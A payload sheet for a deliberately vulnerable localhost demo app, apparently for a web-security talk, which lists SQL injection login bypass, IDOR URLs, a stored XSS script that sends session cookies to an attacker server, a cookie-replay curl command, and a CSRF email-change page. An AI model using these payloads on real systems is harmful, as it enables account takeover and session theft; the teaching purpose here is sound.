# Attack payloads — Chirp demo (localhost only, authorized use)

Run the victim app (`python app/app.py`, port 5050) in **vulnerable** mode and
the attacker server (`python attacker/evil_server.py`, port 6001) alongside.

## 1. SQL injection — auth bypass (slides 23–29)
On `/login`, **Username** field:

```
' OR 1=1 --
```

Password: anything. You are logged in as the first user (Alice) with no
valid credentials.

## 2. Broken access control / IDOR (slides 30–33)
Visit another user's private profile by editing the URL:

```
http://127.0.0.1:5050/profile?user_id=1
http://127.0.0.1:5050/profile?user_id=2      # someone else's email
```

## 3. Stored XSS → cookie theft → session hijack (slides 34–41)
Post this as a **comment** on the feed. Every logged-in visitor who views the
page ships their session cookie to the attacker server:

```html
<script>new Image().src="http://127.0.0.1:6001/steal?c="+encodeURIComponent(document.cookie)</script>
```

The stolen `session=...` cookie appears in `attacker/stolen.log`. Replay it to
hijack the victim's session, e.g. with curl:

```bash
curl -s http://127.0.0.1:5050/profile --cookie "session=<STOLEN_VALUE>"
```

(or paste it into a browser's cookie store via DevTools → Application → Cookies).

## 4. CSRF — forced email change (new)
While logged into Chirp in another tab, open:

```
http://127.0.0.1:6001/csrf_poc.html
```

The page auto-submits and your account email silently becomes
`attacker@evil.com` — the first step of an account takeover (password resets
now go to the attacker).

---
Flip everything off: restart the app with `SECURE=1` and re-run 1–4. Each one
now fails (invalid credentials, 403, inert text, rejected CSRF token).
